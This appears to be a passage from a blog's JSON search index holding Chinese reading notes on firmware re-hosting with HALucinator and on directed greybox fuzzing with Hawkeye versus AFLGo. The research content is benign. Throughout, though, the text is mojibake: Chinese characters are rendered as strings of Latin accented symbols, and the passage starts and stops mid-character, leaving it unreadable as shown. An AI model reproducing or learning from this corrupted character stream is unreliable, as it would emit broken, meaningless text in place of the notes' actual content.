æ³•åšåˆ°çš„ç›¸åŒçš„å¤–éƒ¨åŠŸèƒ½ã€‚HALucinator åœ¨æˆ‘ä»¬çš„æ ·æœ¬å›ºä»¶ä¸Šå¹³å‡æ‰§è¡Œäº†è¶…è¿‡ 1, 000 ä¸ªåŸºæœ¬å—ï¼Œæ˜¯ Avatar2 çš„ 10 å€ã€‚æ¥è‡ªä¸‰ä¸ªä¸åŒåˆ¶é€ å•†çš„å››ä¸ªä¸åŒæ¿å­çš„æ¨¡æ‹Ÿå±•ç¤ºäº† HLE æ”¯æŒå„ç§ç¡¬ä»¶çš„èƒ½åŠ›ï¼Œä»¥åŠæ‰€æœ‰æ¿å­éƒ½ä½¿ç”¨ç›¸åŒå¤–è®¾æ¨¡å‹çš„å¯æ‰©å±•æ€§ï¼Œæ˜¾ç¤ºäº†å®ƒä»¬åœ¨ä¾›åº”å•†å’Œç¡¬ä»¶å¹³å°ä¹‹é—´çš„å¯æ‰©å±•æ€§ã€‚\n5.4 Fuzzing with HALucinator å·´æ‹‰å·´æ‹‰ï¼Œå¤§æ¦‚å°±æ˜¯è¯´æ‰¾äº†å¥½å¤šæ¼æ´ã€‚\nç›¸å…³å·¥ä½œ å‡½æ•°è¯†åˆ«å’Œæ ‡è®°\nBinDiff [28, 55] åŠå…¶å¼€æºå¯¹åº”ç‰© Diaphora [21] ä½¿ç”¨å›¾åŒ¹é…æŠ€æœ¯æœ‰æ•ˆä¸”é«˜æ•ˆåœ°æ¯”è¾ƒä¸¤ä¸ªç¨‹åºã€‚ä½†å¹¶æœªè€ƒè™‘å†²çªã€‚ ç‰¹å¾æå–æŠ€æœ¯åŒ…æ‹¬åŸºäºå‡½æ•°å‰å¥çš„ç­¾å [31]ï¼Œä»ç³»ç»Ÿè°ƒç”¨çš„åå‘åˆ‡ç‰‡ [35]ï¼Œä»¥åŠæ¥è‡ªç¬¦å·æ‰§è¡Œçš„è·Ÿè¸ª [46, 47]ã€‚ åŒ¹é…æå–çš„ç‰¹å¾å·²é€šè¿‡è´å¶æ–¯ç½‘ç»œ [15]ï¼Œç¥ç»ç½‘ç»œ [33] å’Œå±€éƒ¨æ•æ„Ÿå“ˆå¸Œ [24] è¿›è¡Œã€‚ è¿™äº›ç³»ç»Ÿéƒ½ä¸é€‚ç”¨äºæ ‡è®°å›ºä»¶ä¸­çš„å‡½æ•°ï¼šæ— æ³•åˆ†ææˆ–æ‰§è¡Œ ARM Cortex-M ä»£ç ï¼Œç”±äº HAL ä¸­å‡½æ•°çš„å°å°ºå¯¸å’Œç›¸ä¼¼æ€§ï¼Œæœºå™¨å­¦ä¹ æ–¹æ³•å¯ç”¨çš„ä¿¡æ¯ä¸è¶³ï¼Œä»¥åŠæŸäº›æ–¹æ³•æ— æ³•æœ‰æ•ˆåœ°å¤„ç†å†²çªã€‚ å›ºä»¶æ¨¡æ‹Ÿ\næœ€å¸¸è§çš„æ–¹æ³•é‡‡ç”¨ç¡¬ä»¶åœ¨ç¯æ‰§è¡Œï¼Œå¦‚ AVATAR [58]ï¼ŒAVATAR2 [43] å’Œ SURROGATES [36]\nåœ¨è¿™äº›ç³»ç»Ÿä¸­ï¼Œç‰©ç†ç›®æ ‡è®¾å¤‡ä¸åˆ†æç¯å¢ƒç›¸è¿ï¼Œé€šå¸¸ä½¿ç”¨è°ƒè¯•ç«¯å£ï¼Œå¹¶åœ¨æ‰§è¡ŒæœŸé—´ç”±æ ‡å‡†æ¨¡æ‹Ÿå™¨ä½¿ç”¨å…¶ç¡¬ä»¶å¤–è®¾ã€‚ å—å…¶å¯¹ç¡¬ä»¶çš„å¯è§æ€§é™åˆ¶â€”â€”å¤–è®¾å†…éƒ¨çš„çŠ¶æ€ä¸æ¨¡æ‹Ÿå™¨ä¸åŒæ­¥ ä¸æ”¯æŒä¸­æ–­æˆ–ç›´æ¥å­˜å‚¨å™¨è®¿é—® (DMA) å¦ä¸€ç§æ–¹æ³• [19, 20] æ¨¡æ‹Ÿæ¶‰åŠä½¿ç”¨é«˜çº§æ“ä½œç³»ç»Ÿï¼ˆå¦‚ Linuxï¼‰çš„å­˜åœ¨ä½œä¸ºæŠ½è±¡ç‚¹ï¼Œå¹¶ç”¨èƒ½å¤Ÿåœ¨æ¨¡æ‹Ÿå™¨ä¸­è¿è¡Œçš„ç‰ˆæœ¬æ›¿æ¢å›ºä»¶çš„ç‰ˆæœ¬ã€‚è¿™å¯ä»¥è¢«è®¤ä¸ºæ˜¯ä¸€ç§é«˜çº§æ¨¡æ‹Ÿï¼Œå› ä¸ºå®ƒä½¿ç”¨ç”¨æˆ·å†…æ ¸å±éšœä½œä¸ºå»ºæ¨¡è¾¹ç•Œã€‚ç„¶è€Œï¼Œå®ƒåªé€‚ç”¨äºå…·æœ‰æ–‡ä»¶ç³»ç»Ÿæ˜ åƒçš„å›ºä»¶ï¼Œè¯¥æ˜ åƒå¯ä»¥åœ¨ä¸è¿è¡Œä»»ä½•è®¾å¤‡ç‰¹å®šä»£ç çš„æƒ…å†µä¸‹å¯åŠ¨ã€‚åœ¨è¿™é¡¹å·¥ä½œä¸­ï¼Œæˆ‘ä»¬ä¸“é—¨é’ˆå¯¹æ²¡æœ‰è¿™æ ·çš„æ“ä½œç³»ç»Ÿçš„è®¾å¤‡ä¸­å‘ç°çš„â€œblobâ€å›ºä»¶\nä¸è¶³å’Œè®¨è®º HALucinator å®Œå…¨åŸºäº HALï¼Œå›ºä»¶å¦‚æœæ²¡æœ‰ä½¿ç”¨ HALï¼Œé‚£å°±å¹²ä¸äº†äº† å½“ç¼–è¯‘å™¨æˆ–åº“ç‰ˆæœ¬æœªçŸ¥æ—¶ï¼ŒLibMatch çš„æœ‰æ•ˆæ€§æ˜¯æœ‰é™çš„ã€‚å‡½æ•°åŒ¹é…æŠ€æœ¯æ— æ³•åº”å¯¹ç¼–è¯‘å™¨å¼•èµ·çš„ç”Ÿæˆä»£ç ä¸­çš„å˜åŒ–ã€‚LibMatch çš„ä¸»è¦è´¡çŒ®æ˜¯ä½¿ç”¨å‡½æ•°çš„ä¸Šä¸‹æ–‡ï¼ˆè¢«è°ƒç”¨è€…/è°ƒç”¨è€…ï¼‰æ¥æ¶ˆé™¤äºŒè¿›åˆ¶ç­‰æ•ˆå‡½æ•°çš„æ­§ä¹‰ã€‚ ç¼–å†™å¤„ç†ç¨‹åºçš„æ—¶å€™å¯¹äºæ™®é€šç¨‹åºçš„å¤„ç†æ˜¯ä¸æ˜¯æœ‰ç‚¹å¤ªè‰ç‡äº† å¦‚ä½•å®ç° DMA çš„\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/halucinator-firmware-re-hosting-through-abstraction-layer-emulation/","summary":"ä¸­æ–‡è¯‘åï¼šHALucinator: é€šè¿‡æŠ½è±¡å±‚ä»¿çœŸé‡æ–°æ‰˜ç®¡å›ºä»¶ ä½œè€…ï¼šAbraham A. Clements å•ä½ï¼šæ¡‘è¿ªäºšå›½å®¶å®éªŒå®¤ å›½å®¶ï¼š #ç¾å›½ å¹´ä»½ï¼š #2020å¹´ æ¥æº","title":"HALucinator Firmware Re-hosting Through Abstraction Layer Emulation"},{"content":"ä¸­æ–‡è¯‘åï¼šhawkeye: éœ€æ±‚å¯¼å‘çš„ç°ç›’æ¨¡ç³Šæµ‹è¯• ä½œè€…ï¼šHongxu Chen å•ä½ï¼šå—æ´‹ç†å·¥å¤§å­¦ å›½å®¶ï¼š #æ–°åŠ å¡ å¹´ä»½ï¼š #2018å¹´ æ¥æºï¼š #ccs å…³é”®å­—ï¼š #å®šå‘fuzzing #fuzzing #ç°ç›’ ä»£ç åœ°å€ï¼š https://github.com/hongxuchen/Hawkeye ä»‹ç»ç½‘ç«™ï¼šHawkeye (google.com) ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-02-28 09:30\næ‘˜è¦ ç›®çš„ï¼šæé«˜ç°ç›’æ¨¡ç³Šå™¨çš„æŒ‡å‘æ€§ æ–¹æ³•ï¼šé™æ€åˆ†ææ”¶é›†ä¿¡æ¯ï¼ˆè°ƒç”¨å›¾ã€å‡½æ•°å’ŒåŸºæœ¬å—çº§åˆ«çš„ç›®æ ‡è·ç¦»ï¼‰ï¼›åŸºäºé™æ€ä¿¡æ¯å’Œæ‰§è¡Œè·Ÿè¸ªè¯„ä¼°æ‰§è¡Œçš„ç§å­ï¼Œç”ŸæˆåŠ¨æ€æŒ‡æ ‡ï¼Œç”¨äºç§å­ä¼˜å…ˆçº§ã€èƒ½é‡åˆ†é…å’Œè‡ªé€‚åº”å˜å¼‚ åˆ›æ–°ï¼šæ–°é¢–çš„é™æ€åˆ†æã€åŠ¨æ€æŒ‡æ ‡ç”Ÿæˆ æ•ˆæœï¼šç›¸æ¯”äº AFL å’Œ AFLGo ç­‰æœ€å…ˆè¿›çš„ç°ç›’æ¨¡ç³Šæµ‹è¯•å™¨ï¼ŒHawkeye å¯ä»¥æ›´å¿«åœ°åˆ°è¾¾ç›®æ ‡ç«™ç‚¹å¹¶é‡ç°å´©æºƒã€‚ç‰¹åˆ«æ˜¯ï¼ŒHawkeye å¯ä»¥å°†æš´éœ²æŸäº›æ¼æ´çš„æ—¶é—´ä»çº¦ 3.5 å°æ—¶ç¼©çŸ­è‡³ 0.5 å°æ—¶ã€‚\n1å¼•è¨€ åœ¨é™æ€åˆ†ææå–ä¿¡æ¯åï¼ŒåŠ¨æ€åˆ†æä¸­æœ‰å‡ ä¸ªæŒ‘æˆ˜â€”â€”å¦‚ä½•åŠ¨æ€è°ƒæ•´ä¸åŒç­–ç•¥ï¼Œä»¥ä¾¿å°½å¿«åˆ°è¾¾ç›®æ ‡ç«™ç‚¹ã€‚ç¬¬ä¸€ä¸ªæŒ‘æˆ˜æ˜¯å¦‚ä½•æ­£ç¡®åˆ†é…èƒ½é‡ç»™ä¸åŒè·ç¦»çš„è¾“å…¥ï¼Œä»¥åŠå¦‚ä½•ä¼˜å…ˆè€ƒè™‘ç¦»ç›®æ ‡æ›´è¿‘çš„è¾“å…¥ã€‚è¿™æ¨å¯¼å‡ºç¬¬ä¸‰ä¸ªæœŸæœ›å±æ€§P3ã€‚ç¬¬äºŒä¸ªæŒ‘æˆ˜æ˜¯å¦‚ä½•é€‚åº”æ€§åœ°æ”¹å˜å˜å¼‚ç­–ç•¥ï¼Œå› ä¸ºGFså¯èƒ½åœ¨ç²—ç²’åº¦ï¼ˆä¾‹å¦‚æ‰¹é‡åˆ é™¤ï¼‰å’Œç»†ç²’åº¦ï¼ˆä¾‹å¦‚æŒ‰ä½ç¿»è½¬ï¼‰ä¸¤ä¸ªå±‚æ¬¡ä¸Šæ‹¥æœ‰å„ç§å˜å¼‚æ“ä½œç¬¦ã€‚è¿™æ¨å¯¼å‡ºç¬¬å››ä¸ªæœŸæœ›å±æ€§P4ã€‚å› æ­¤ï¼Œç¬¬äºŒä¸ªé—®é¢˜æ˜¯å¯¹DGFä¸­ä½¿ç”¨çš„åŠ¨æ€ç­–ç•¥è¿›è¡Œé€‚å½“è°ƒæ•´ã€‚\nèƒŒæ™¯ï¼š åœ¨ä¸€äº›æµ‹è¯•åœºæ™¯ä¸‹éœ€è¦å®šå‘ fuzzing æ¼æ´é‡ç° åœ¨ä¸€ä¸ªå¹³å°ä¸Šå‘ç°äº†æ¼æ´ï¼Œé‚£ä¹ˆåœ¨å…¶ä»–ç±»ä¼¼å¹³å°æ˜¯å¦æœ‰ç›¸ä¼¼æ¼æ´ æµ‹è¯•è¡¥ä¸ æœ€å…ˆè¿›ï¼ˆ2018 å¹´å‰ï¼‰çš„å®šå‘ç°ç›’ fuzzer æ˜¯ AFLGO AFLGo å°†åˆ°è¾¾ç›®æ ‡ç«™ç‚¹çš„å¯è¾¾æ€§è§†ä¸ºä¸€ç§ä¼˜åŒ–é—®é¢˜ï¼Œå¹¶é‡‡ç”¨å…ƒå¯å‘å¼æ–¹æ³•æ¥ä¿ƒè¿›å…·æœ‰æ›´çŸ­è·ç¦»çš„æµ‹è¯•ç§å­ã€‚è¿™é‡Œï¼Œè·ç¦»æ˜¯æ ¹æ®è¾“å…¥ç§å­çš„æ‰§è¡Œè·Ÿè¸ªä¸­åˆ°ç›®æ ‡åŸºæœ¬å—çš„å¹³å‡åŸºæœ¬å—æƒé‡è®¡ç®—çš„ï¼Œå…¶ä¸­æƒé‡ç”±ç¨‹åºçš„è°ƒç”¨å›¾å’Œæ§åˆ¶æµå›¾ä¸­çš„è¾¹å†³å®šï¼Œå…ƒå¯å‘å¼æ–¹æ³•ä¸ºæ¨¡æ‹Ÿé€€ç«ã€‚ æŒ‘æˆ˜ï¼š æ‹¥æœ‰ä¸€ä¸ªåˆé€‚çš„é™æ€åˆ†ææ¥æ”¶é›† DGF æ‰€éœ€ä¿¡æ¯ã€‚ å¦‚ä½•æœ‰æ•ˆçš„è®¡ç®—åˆ° target sites çš„æœ‰æ•ˆè·ç¦»è€Œä¸æŸå®³æœ‰äº›æœŸæœ›ç‰¹å¾ï¼Œç‰¹åˆ«åœ°ï¼Œå®ƒåº”è¯¥æœ‰åŠ©äºä¿ç•™ç§å­å¤šæ ·æ€§ AFLGO ä¼˜å…ˆåˆ†é…èƒ½é‡ç»™è·ç¦» target sites æœ€çŸ­çš„ç§å­ï¼Œä½†æ˜¯è¿™æ ·åè€Œä¼šå¯¼è‡´é¥¿æ­»é‚£äº›æ›´å¿«è§¦å‘æ¼æ´çš„ç§å­ã€‚ï¼ˆå› ä¸ºè®¡ç®—æ–¹æ³•çš„é—®é¢˜ï¼Œå¯èƒ½ç®—å‡ºæ¥çš„æœ€çŸ­è·ç¦»å¹¶ä¸æ˜¯ç›´è§‚ä¸Šçš„æœ€çŸ­è·ç¦»ï¼‰ï¼ˆè¿™ä¸ªè²Œä¼¼åœ¨ MC2 ä¸­æœ‰æåŠï¼Œç­‰æˆ‘å»ç¿»ç¿»ï¼‰ LibFuzzer è®¤ä¸ºä¸è€ƒè™‘æ‰€æœ‰çš„è·¯å¾„å¯èƒ½ä¼šæ¼æ‰éšè—åœ¨è¾ƒé•¿è·¯å¾„æ·±å¤„çš„é”™è¯¯ å¦‚ä½•å‡å°é™æ€åˆ†æçš„å¼€é”€ å¯¹ DGF ä¸­ä½¿ç”¨çš„åŠ¨æ€ç­–ç•¥è¿›è¡Œé€‚å½“è°ƒæ•´ å¦‚ä½•åˆ†é…èƒ½é‡ å¦‚ä½•é€‚åº”æ€§ï¼ˆåŠ¨æ€ï¼‰çš„è°ƒæ•´å˜å¼‚ç­–ç•¥ ç›®çš„ï¼š åŸºäºä»¥ä¸Šçš„æŒ‘æˆ˜ï¼Œä½œè€…æ€»ç»“äº† DGF åº”è¯¥æœ‰çš„å››ä¸ªå±æ€§ï¼ˆæ‘˜è¦é‡Œæåˆ°çš„é‚£ä¸ª featureï¼‰ P1 DGF åº”è¯¥å…·æœ‰ä¸€ä¸ªåŸºäºè·ç¦»çš„å¼ºå¤§æœºåˆ¶ï¼Œèƒ½å¤Ÿé€šè¿‡è€ƒè™‘æ‰€æœ‰åˆ°ç›®æ ‡çš„è½¨è¿¹å¹¶é¿å…å¯¹æŸäº›è½¨è¿¹çš„åè§æ¥æŒ‡å¯¼å®šå‘æ¨¡ç³Šæµ‹è¯•ã€‚ P2 DGF åº”è¯¥åœ¨é™æ€åˆ†æä¸­å¹³è¡¡å¼€é”€å’Œæ•ˆç”¨ã€‚ P3 DGF åº”è¯¥ä¼˜å…ˆå®‰æ’ç§å­ä»¥å¿«é€Ÿåˆ°è¾¾ç›®æ ‡ç«™ç‚¹ã€‚ P4 å½“ç§å­è¦†ç›–ä¸åŒç¨‹åºçŠ¶æ€æ—¶ï¼ŒDGF åº”é‡‡ç”¨è‡ªé€‚åº”å˜å¼‚ç­–ç•¥ã€‚ æ–¹æ³•ï¼š å¯¹äº P1ï¼Œä½¿ç”¨åŸºäºå¢å¼ºçš„ç›¸é‚»å‡½æ•°è·ç¦»æ¥è®¡ç®—å‡½æ•°çº§è·ç¦»å’ŒåŸºæœ¬å—è·ç¦»ï¼ŒåŒæ—¶åœ¨æ¨¡ç³Šæµ‹è¯•ä¸­å°†é™æ€åˆ†æç»“æœå’Œè¿è¡Œæ—¶æ‰§è¡Œä¿¡æ¯ç»“åˆï¼Œè®¡ç®—æ‰§è¡Œè½¨è¿¹å’Œ target sites åŸºæœ¬å—è½¨è¿¹è·ç¦»å’Œè¦†ç›–å‡½æ•°ç›¸ä¼¼åº¦ã€‚ï¼ˆè¯´ç™½äº†å°±æ˜¯åŠ¨é™ç»“åˆï¼‰ å¯¹äº P2ï¼Œåº”ç”¨åŸºäºè°ƒç”¨å›¾ï¼ˆCGï¼‰å’Œæ§åˆ¶æµå›¾ï¼ˆCFGï¼‰çš„åˆ†æï¼Œå³å‡½æ•°çº§å¯è¾¾æ€§åˆ†æã€å‡½æ•°æŒ‡é’ˆï¼ˆé—´æ¥è°ƒç”¨ï¼‰çš„æŒ‡å‘åˆ†æå’ŒåŸºæœ¬å—åº¦é‡ï¼ˆÂ§4.1ï¼‰ã€‚ï¼ˆè¿™æ€ä¹ˆå¹³è¡¡å¼€é”€ï¼Ÿï¼‰ å¯¹äº P3ï¼Œæˆ‘ä»¬å»ºè®®å°†åŸºæœ¬å—è½¨è¿¹è·ç¦»å’Œè¦†ç›–å‡½æ•°ç›¸ä¼¼åº¦ç»“åˆèµ·æ¥è§£å†³åŠŸç‡è°ƒåº¦é—®é¢˜ï¼ˆÂ§4.4ï¼‰å’Œç§å­ä¼˜å…ˆçº§é—®é¢˜ï¼ˆÂ§4.6ï¼‰ã€‚ å¯¹äº P4ï¼Œæˆ‘ä»¬å»ºè®®æ ¹æ®å¯è¾¾æ€§åˆ†æå’Œè¦†ç›–å‡½æ•°ç›¸ä¼¼åº¦åº”ç”¨è‡ªé€‚åº”å˜å¼‚ç­–ç•¥ï¼ˆÂ§4.5ï¼‰ã€‚ åˆ›æ–°ï¼š å¢å¼ºçš„ç›¸é‚»å‡½æ•°è·ç¦» åŸºæœ¬å—è½¨è¿¹è·ç¦»å’Œè¦†ç›–å‡½æ•°ç›¸ä¼¼åº¦ç›¸ç»“åˆæŒ‡å¯¼èƒ½é‡è°ƒåº¦ å¯è¾¾æ€§åˆ†æå’Œè¦†ç›–å‡½æ•°ç›¸ä¼¼åº¦æŒ‡å¯¼å˜å¼‚ç­–ç•¥ æ•ˆæœï¼š 2æœŸæœ›çš„ DGF ç‰¹æ€§ 2.1Motivating Example ä½œè€…ä¸¾äº†ä¸€ä¸ªä¾‹å­æ¥å±•ç¤ºæœ€çŸ­è·¯å¾„çš„å¼Šç«¯ï¼š å¦‚å›¾æ‰€ç¤ºï¼Œè¿™ä¸ªé”™è¯¯æ˜¯åœ¨ GNU binutils ä¸­çš„ nm ä¸­è§¦å‘çš„ï¼Œå´©æºƒå‡½æ•°æ˜¯ Tï¼Œå›¾äºŒå±•ç¤ºäº†è§¦å‘æ¼æ´çš„è·¯å¾„è¦é•¿äºå…¶ä»–è·¯å¾„ï¼Œæ‰€ä»¥è¯¥æ¼æ´å¯¹äºä¸€èˆ¬çš„ç°ç›’æ¨¡ç³Šå¾ˆéš¾å‘ç°ã€‚åœ¨æˆ‘ä»¬è¿›è¡Œçš„ 10 æ¬¡ä¸åŒè¿è¡Œä¸­ï¼ŒAFL [48]éƒ½æ— æ³•åœ¨ 24 å°æ—¶å†…æ£€æµ‹åˆ°è¿™ä¸ªæ¼æ´ã€‚\nç°æœ‰ DGF çš„æŒ‘æˆ˜æ ¹æºäºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š 1ï¼‰ç›®æ ‡å‡½æ•°å¯èƒ½å‡ºç°åœ¨ PUT çš„å¤šä¸ªä½ç½®ï¼Œå¤šæ¡ä¸åŒçš„è½¨è¿¹å¯èƒ½é€šå‘ç›®æ ‡ã€‚ 2ï¼‰ç”±äºè°ƒç”¨å›¾ä¸»è¦å½±å“è½¨è¿¹è·ç¦»ï¼ˆä¸ç›®æ ‡ç«™ç‚¹çš„ä¸ç›¸ä¼¼æ€§ï¼‰çš„è®¡ç®—ï¼Œå› æ­¤éœ€è¦å‡†ç¡®å»ºç«‹ï¼›ç‰¹åˆ«æ˜¯ï¼Œå‡½æ•°ä¹‹é—´çš„é—´æ¥è°ƒç”¨ä¸åº”è¢«å¿½ç•¥ã€‚ 2.2 å®šå‘æ¨¡ç³Šçš„æœŸæœ›æ€§è´¨ P1ï¼šDGF åº”å®šä¹‰ä¸€ç§å¼ºå¤§çš„åŸºäºè·ç¦»çš„æœºåˆ¶ï¼Œå¯ä»¥é€šè¿‡é¿å…å¯¹æŸäº›è·¯å¾„çš„åè§å¹¶è€ƒè™‘æ‰€æœ‰è·¯å¾„åˆ°ç›®æ ‡æ¥æŒ‡å¯¼æœ‰å‘æ¨¡ç³Šæµ‹è¯•ã€‚ æŒ‡å¯¼æœºåˆ¶å¯ä»¥æä¾›æ‰€æœ‰å¯èƒ½é€šå¾€ç›®æ ‡çš„è·¯å¾„çš„çŸ¥è¯†ï¼Œå¹¶é€šè¿‡é€æ¸å‡å°‘è·ç¦»æ¥å¼•å¯¼çªå˜æœç€å®ƒã€‚å¹¶ä¸”æ‰€æœ‰è·¯å¾„åˆ°è¾¾ç›®æ ‡çš„è·ç¦»éƒ½åº”æ­£ç¡®è®¡ç®—ï¼Œä»¥ä¾¿ä¸å…¶ä»–è·¯å¾„ç›¸æ¯”åˆ†é…æ›´å¤šèƒ½é‡ç»™æ‰€æœ‰å¯è¾¾åˆ°ç›®æ ‡çš„è·¯å¾„ã€‚ é‡ç‚¹åœ¨äºè·ç¦»çš„æ­£ç¡®ï¼ˆæœ‰æ•ˆï¼‰è®¡ç®— P2ï¼šDGF åº”åœ¨é™æ€åˆ†æä¸­å¹³è¡¡å¼€é”€å’Œæ•ˆç”¨ã€‚ å¯¹äºéš¾ä»¥åˆ†æçš„ä¿¡æ¯ï¼ˆC/C++ç¨‹åºä¸­çš„é—´æ¥å‡½æ•°è°ƒç”¨æ— æ³•ç›´æ¥ä»æºä»£ç æˆ–äºŒè¿›åˆ¶æŒ‡ä»¤è§‚å¯Ÿ call siteï¼‰ï¼Œæƒè¡¡åˆ†æçš„å¼€é”€å’Œæ•ˆç”¨ å¹¶éæ‰€æœ‰è°ƒç”¨å…³ç³»éƒ½åº”è¢«å¹³ç­‰å¯¹å¾…ã€‚æŸäº›å‡½æ•°åœ¨å…¶è°ƒç”¨å‡½æ•°ä¸­å‡ºç°å¤šæ¬¡ï¼Œé‚£ä¹ˆå¯¹äºå‡ºç°é¢‘ç‡å°çš„å‡½æ•°è€Œè¨€ï¼Œè¯¥ç±»å‡½æ•°åº”è¯¥ç¦»å…¶è°ƒç”¨å‡½æ•°â€œæ›´è¿‘â€ ç„¶è€Œï¼Œåœ¨é™æ€çŸ­è¯­ä¸­å»ºæ¨¡å®é™…åˆ†æ”¯æ¡ä»¶æ˜¯ä¸åˆ‡å®é™…çš„ï¼Œå› ä¸ºé™æ€åˆ†æå›ºæœ‰çš„å±€é™æ€§ã€‚ä¾‹å¦‚ï¼Œå¯¹äºä¸€ä¸ªéå¹³å‡¡çš„ä»£ç æ®µï¼Œåœ¨è¿è¡Œæ—¶å¾ˆéš¾é¢„æµ‹è°“è¯çš„çœŸåˆ†æ”¯æ˜¯å¦æ¯”å…¶å‡åˆ†æ”¯æ‰§è¡Œå¾—æ›´é¢‘ç¹ã€‚å¦ä¸€æ–¹é¢ï¼Œåœ¨ç°ç›’æ¨¡ç³Šæµ‹è¯•è®¾ç½®ä¸­åŠ¨æ€è·Ÿè¸ªç¬¦å·æ¡ä»¶å°†å¤ªè€—æ—¶ã€‚ P3ï¼šDGF åº”é€‰æ‹©å¹¶å®‰æ’ç§å­ä»¥å¿«é€Ÿåˆ°è¾¾ç›®æ ‡ç«™ç‚¹ã€‚ åœ¨æœ‰å‘æ¨¡ç³Šæµ‹è¯•ä¸­ï¼Œæ¨¡ç³Šæµ‹è¯•çš„ç›®æ ‡ä¸æ˜¯å°½å¿«è¾¾åˆ°è¦†ç›–ç‡çš„ä¸Šé™ï¼Œè€Œæ˜¯å°½å¿«åˆ°è¾¾ç‰¹å®šç›®æ ‡ã€‚æ‰€ä»¥èƒ½é‡è°ƒåº¦å’Œç§å­ä¼˜å…ˆçº§éƒ½åº”è¯¥ä»¥å°½å¿«è¾¾åˆ° target sites ä¸ºæ ‡å‡† å®ƒä»¬éƒ½å¯ä»¥é€šè¿‡åŸºäºè·ç¦»çš„æœºåˆ¶æ¥æŒ‡å¯¼ P4ï¼šå½“ç§å­è¦†ç›–ä¸åŒçš„ç¨‹åºçŠ¶æ€æ—¶ï¼ŒDGF åº”é‡‡ç”¨è‡ªé€‚åº”çªå˜ç­–ç•¥ã€‚ é€šå¸¸ï¼Œçªå˜å™¨å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªçº§åˆ«ï¼šç»†ç²’åº¦çªå˜ï¼ˆä¾‹å¦‚ä½ç¿»è½¬ï¼‰å’Œç²—ç²’åº¦çªå˜ï¼ˆä¾‹å¦‚å—æ›¿æ¢ï¼‰ã€‚å°½ç®¡æ²¡æœ‰ç›´æ¥è¯æ®è¡¨æ˜ç»†ç²’åº¦çªå˜å¾ˆå¯èƒ½ä¿ç•™æ‰§è¡Œè·Ÿè¸ªï¼Œä½†äººä»¬æ™®éè®¤ä¸ºç²—ç²’åº¦éšæœºçªå˜å¾ˆå¯èƒ½å¤§å¤§æ”¹å˜æ‰§è¡Œè·Ÿè¸ªã€‚ å› æ­¤ï¼ŒæœŸæœ›çš„è®¾è®¡æ˜¯å½“ä¸€ä¸ªç§å­å·²ç»åˆ°è¾¾ç›®æ ‡ç«™ç‚¹ï¼ˆåŒ…æ‹¬ç›®æ ‡è¡Œã€åŸºæœ¬å—æˆ–å‡½æ•°ï¼‰æ—¶ï¼Œå®ƒåº”è¯¥ç»™äºˆè¾ƒå°‘çš„ç²—ç²’åº¦çªå˜æœºä¼šã€‚ï¼ˆæ„æ€å°±æ˜¯å½“ç§å­å·²ç»è¾¾åˆ° target siteï¼Œå°±è®©å®ƒç»†ç²’åº¦çªå˜ï¼Œå°±æ˜¯å˜åŒ–ä¸è¦é‚£ä¹ˆå¤§ï¼Œè¿™æ ·å°±æ›´å¯èƒ½çªå˜åˆ°å¦ä¸€æ¡å¯ä»¥åˆ°è¾¾ target site çš„è·¯å¾„ï¼‰ 2.3 AFLGO çš„è§£å†³æ–¹æ³• å¯¹äº P1ã€‚å¯¹äºå›¾ 2ï¼ŒåŸºäº AFLGo å®šä¹‰çš„è·ç¦»å…¬å¼ï¼Œåˆ†é…ç»™å›¾ 2çš„èƒ½é‡å°†æ˜¯âŸ¨a, e, T, ZâŸ©\u0026gt;âŸ¨a, e, f, ZâŸ©\u0026gt;âŸ¨a, b, c, d, T, ZâŸ©ã€‚è¿™æ˜¯æœ‰é—®é¢˜çš„ï¼šæ­£å¸¸è½¨è¿¹âŸ¨a, e, T, ZâŸ©è¢«è¿‡åˆ†å¼ºè°ƒï¼›å´©æºƒè½¨è¿¹âŸ¨a, b, c, d, T, ZâŸ©å´è¢«è®¤ä¸ºæ˜¯æœ€ä¸é‡è¦çš„ï¼Œç”šè‡³æ¯”æœªè¾¾åˆ°ç›®æ ‡ T çš„è½¨è¿¹âŸ¨a, e, f, ZâŸ©è¿˜è¦ä¸é‡è¦ã€‚ P2ã€‚AFLGo åªè€ƒè™‘æ˜¾å¼è°ƒç”¨å›¾ä¿¡æ¯ã€‚è¿™å°†ä¼šå¿½ç•¥å‡½æ•°æŒ‡é’ˆçš„è°ƒç”¨ï¼Œä»»ä½•é€šè¿‡å‡½æ•°æŒ‡é’ˆè¿›è¡Œè°ƒç”¨çš„å‡½æ•°åœ¨ AFLGO çœ‹æ¥éƒ½æ˜¯ä¸å¯è¾¾ã€‚æ‰€ä»¥ AFLGO é™æ€åˆ†æå¾—åˆ°çš„ä¿¡æ¯æ˜¯ä¸å®Œæ•´çš„ã€‚ æ­¤å¤–ä½œè€…æŒ‡å‡º AFLGO è°ƒç”¨æ–¹å’Œè¢«è°ƒç”¨æ–¹çš„è·ç¦»çš„è®¡ç®—æ–¹å¼æ¯”è¾ƒç®€å•ï¼Œå¿½ç•¥äº†ä¸åŒçš„è°ƒç”¨æ–¹å¼å’Œè°ƒç”¨æ¬¡æ•°ã€‚ ï¼ˆè¿™å‡ ä¸ªç¼ºç‚¹ä¸éƒ½æ˜¯é’ˆå¯¹ P1 çš„å—ï¼Œæ€ä¹ˆå°±æŒªåˆ° P2 äº†ï¼‰ P3ã€‚AFLGO é‡‡ç”¨æ¨¡æ‹Ÿé€€ç«çš„ç®—æ³•ï¼Œå€¾å‘äºç»™æ›´æ¥è¿‘ç›®æ ‡çš„ç§å­æ›´å¤šçš„èƒ½é‡ï¼ŒåŒæ—¶ä¹Ÿæœ‰æªæ–½æ¥ä¿ƒè¿›æ›´å¥½çš„å˜å¼‚ï¼ˆè¿™é‡Œè¦å›çœ‹ä¸€ä¸‹ aflgoï¼Œæœ‰ç‚¹å¿˜äº†ï¼‰ P4ã€‚AFLGo çš„çªå˜ç®—å­æ¥è‡ªäº AFL çš„ä¸¤ç§éç¡®å®šæ€§ç­–ç•¥:1) havocï¼Œå³çº¯ç²¹éšæœºçš„çªå˜ï¼Œå¦‚ä½ç¿»è½¬ã€å—æ›¿æ¢ç­‰; 2) spliceï¼Œå®ƒä»ä¸¤ä¸ªç°æœ‰ç§å­çš„ä¸€äº›éšæœºå­—èŠ‚éƒ¨åˆ†ç”Ÿæˆç§å­ã€‚è¿™ç§éç¡®å®šæ€§ç­–ç•¥å¤ªéšæ„ï¼Œå¯èƒ½ä¼šç 